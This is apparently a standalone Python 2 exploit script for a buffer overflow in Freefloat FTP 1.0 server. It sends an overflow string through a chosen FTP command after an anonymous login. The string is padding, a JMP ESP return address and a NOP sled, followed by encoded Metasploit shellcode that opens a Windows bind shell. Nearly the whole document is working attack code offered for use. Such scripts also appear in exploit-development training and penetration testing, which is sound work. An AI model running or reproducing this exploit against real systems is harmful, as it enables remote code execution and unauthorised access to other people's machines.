
import socket,sys,time,struct

if len(sys.argv) < 2:
     print "[-]Usage: %s <target addr> <command>" % sys.argv[0] + "\r"
     print "[-]For example [filename.py 192.168.1.10 PWND] would do the trick."
     print "[-]Other options: AUTH, APPE, ALLO, ACCT"
     sys.exit(0)

target = sys.argv[1]
command = sys.argv[2]

if len(sys.argv) > 2:
     platform = sys.argv[2]

#./msfconsole
# use windows/shell_bind_tcp
# generate -b "\x00\xff\x0d\x0a\x3d\x20" -e x86/shikata_ga_nai

shell = ("\xda\xcc\xd9\x74\x24\xf4\xba\x8e\x96\x29\xc1\x5f\x2b\xc9" +
"\xb1\x53\x31\x57\x17\x83\xc7\x04\x03\xd9\x85\xcb\x34\x19" +
"\x41\x89\xb7\xe1\x92\xee\x3e\x04\xa3\x2e\x24\x4d\x94\x9e" +
"\x2e\x03\x19\x54\x62\xb7\xaa\x18\xab\xb8\x1b\x96\x8d\xf7" +
"\x9c\x8b\xee\x96\x1e\xd6\x22\x78\x1e\x19\x37\x79\x67\x44" +
"\xba\x2b\x30\x02\x69\xdb\x35\x5e\xb2\x50\x05\x4e\xb2\x85" +
"\xde\x71\x93\x18\x54\x28\x33\x9b\xb9\x40\x7a\x83\xde\x6d" +
"\x34\x38\x14\x19\xc7\xe8\x64\xe2\x64\xd5\x48\x11\x74\x12" +
"\x6e\xca\x03\x6a\x8c\x77\x14\xa9\xee\xa3\x91\x29\x48\x27" +
"\x01\x95\x68\xe4\xd4\x5e\x66\x41\x92\x38\x6b\x54\x77\x33" +
"\x97\xdd\x76\x93\x11\xa5\x5c\x37\x79\x7d\xfc\x6e\x27\xd0" +
"\x01\x70\x88\x8d\xa7\xfb\x25\xd9\xd5\xa6\x21\x2e\xd4\x58" +
"\xb2\x38\x6f\x2b\x80\xe7\xdb\xa3\xa8\x60\xc2\x34\xce\x5a" +
"\xb2\xaa\x31\x65\xc3\xe3\xf5\x31\x93\x9b\xdc\x39\x78\x5b" +
"\xe0\xef\x15\x53\x47\x40\x08\x9e\x37\x30\x8c\x30\xd0\x5a" +
"\x03\x6f\xc0\x64\xc9\x18\x69\x99\xf2\x37\x36\x14\x14\x5d" +
"\xd6\x70\x8e\xc9\x14\xa7\x07\x6e\x66\x8d\x3f\x18\x2f\xc7" +
"\xf8\x27\xb0\xcd\xae\xbf\x3b\x02\x6b\xde\x3b\x0f\xdb\xb7" +
"\xac\xc5\x8a\xfa\x4d\xd9\x86\x6c\xed\x48\x4d\x6c\x78\x71" +
"\xda\x3b\x2d\x47\x13\xa9\xc3\xfe\x8d\xcf\x19\x66\xf5\x4b" +
"\xc6\x5b\xf8\x52\x8b\xe0\xde\x44\x55\xe8\x5a\x30\x09\xbf" +
"\x34\xee\xef\x69\xf7\x58\xa6\xc6\x51\x0c\x3f\x25\x62\x4a" +
"\x40\x60\x14\xb2\xf1\xdd\x61\xcd\x3e\x8a\x65\xb6\x22\x2a" +
"\x89\x6d\xe7\x5a\xc0\x2f\x4e\xf3\x8d\xba\xd2\x9e\x2d\x11" +
"\x10\xa7\xad\x93\xe9\x5c\xad\xd6\xec\x19\x69\x0b\x9d\x32" +
"\x1c\x2b\x32\x32\x35")

#74f73165   FFE4             JMP ESP kernel32.dll
memory = struct.pack('<L', 0x74f73165)
pad = "\x90" * 150
crash = "\x41" * 246 + memory + pad + shell

print "\
[*] Freefloat FTP 1.0 Crash Buffer Overflow "+target

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    s.connect((target,21))
except:
    print "[-] Connection to "+target+" failed!"
    sys.exit(0)

print "[*] Sending " + `len(crash)` + " " + command +" byte crash..."

s.send("USER anonymous\r\n")
s.recv(1024)
s.send("PASS \r\n")
s.recv(1024)
s.send(command +" " + crash + "\r\n")
time.sleep(4)
